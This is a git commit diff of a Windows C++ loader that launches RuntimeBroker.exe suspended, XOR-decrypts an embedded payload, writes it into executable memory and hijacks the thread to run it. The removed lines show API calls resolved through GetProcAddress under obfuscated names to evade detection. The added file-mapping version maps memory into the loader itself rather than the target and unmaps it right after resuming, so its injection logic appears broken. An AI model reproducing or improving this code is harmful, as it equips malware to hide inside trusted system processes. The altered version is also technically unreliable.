ef08a3e9c775d0542db9b6e30f8895718763ebcb
dhanush <114467712+dagowda@users.noreply.github.com>
2025-01-02 01:51:02 -0500

    Update hollow_dynamic.cpp

--- dummyda/hollow_dynamic.cpp
+++ dummyda/hollow_dynamic.cpp
@@ -1,4 +1,3 @@
-
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -24,51 +23,84 @@ int main() {
     char* ke;
     DWORD keLen;
     its_load_re("dhanushkey1", &ke, &keLen);
-    const char* processptaah = "C:\\Windows\\System32\\RuntimeBroker.exe";
+    const char* processPath = "C:\\Windows\\System32\\RuntimeBroker.exe";
     char* code199k;
     DWORD code199kLen;
     its_load_re("dhanushcode56", &code199k, &code199kLen);
 
-    STARTUPINFO li = {0};
-    
-  HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
-
-    BOOL (*itscreatetPro)(
-        LPCSTR lpApplicationName,LPSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,
-        LPPROCESS_INFORMATION lpProcessInformation
-    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
-        GetProcAddress(istfromKernel32, "CreateProcessA");
-
-  LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
-    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(istfromKernel32, "VirtualAllocEx");
-    
-
-   BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
-    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKernel32, "WriteProcessMemory");
-     
+    STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
-    li.cb = sizeof(li);
     
+    si.cb = sizeof(si);
     
-    itscreatetPro(processptaah, 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &li, &pi);
-    GetTickCount();
-    
-    CONTEXT ctx = {0};
-  
-    ctx.ContextFlags = CONTEXT_FULL;
-    
-    GetThreadContext(pi.hThread, &ctx);
+    // Create a new process in a suspended state
+    if (!CreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        std::cerr << "CreateProcess failed with error code " << GetLastError() << std::endl;
+        return -1;
+    }
 
-    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    
+    // Get the thread context
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(pi.hThread, &ctx)) {
+        std::cerr << "GetThreadContext failed with error code " << GetLastError() << std::endl;
+        return -1;
+    }
+
+    // Create a file mapping (shared memory)
+    HANDLE hMapFile = CreateFileMappingA(
+        INVALID_HANDLE_VALUE,  // Use system paging file
+        NULL,                  // Default security
+        PAGE_EXECUTE_READWRITE, // Read/Write access
+        0,                     // Maximum object size (high-order DWORD)
+        code199kLen,           // Maximum object size (low-order DWORD)
+        NULL                   // Name of the mapping object
+    );
+
+    if (hMapFile == NULL) {
+        std::cerr << "CreateFileMapping failed with error code " << GetLastError() << std::endl;
+        return -1;
+    }
+
+    // Map the view of the file into the process's memory space
+    LPVOID lpBase = MapViewOfFile(
+        hMapFile,              // Handle to the mapping object
+        FILE_MAP_ALL_ACCESS,   // Read/Write access
+        0,                     // High-order DWORD of the file offset
+        0,                     // Low-order DWORD of the file offset
+        code199kLen            // Number of bytes to map
+    );
+
+    if (lpBase == NULL) {
+        std::cerr << "MapViewOfFile failed with error code " << GetLastError() << std::endl;
+        CloseHandle(hMapFile);
+        return -1;
+    }
+
+    // XOR decrypt the code
     for (DWORD i = 0; i < code199kLen; i++) {
         code199k[i] ^= ke[i % keLen];
     }
-    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
-    ctx.Rcx = (DWORD64)gallio; 
-    SetThreadContext(pi.hThread, &ctx);
 
-    ResumeThread(pi.hThread); 
+    // Copy the decrypted payload into the mapped memory
+    memcpy(lpBase, code199k, code199kLen);
+
+    // Set the thread context to point to the mapped memory (entry point for execution)
+    ctx.Rcx = (DWORD64)lpBase; // Set the appropriate register (for 64-bit systems, Rcx is used for the first argument)
+    
+    if (!SetThreadContext(pi.hThread, &ctx)) {
+        std::cerr << "SetThreadContext failed with error code " << GetLastError() << std::endl;
+        UnmapViewOfFile(lpBase);
+        CloseHandle(hMapFile);
+        return -1;
+    }
+
+    // Resume the thread to execute the code
+    ResumeThread(pi.hThread);
+
+    // Cleanup
+    UnmapViewOfFile(lpBase);
+    CloseHandle(hMapFile);
 
     return 0;
 }
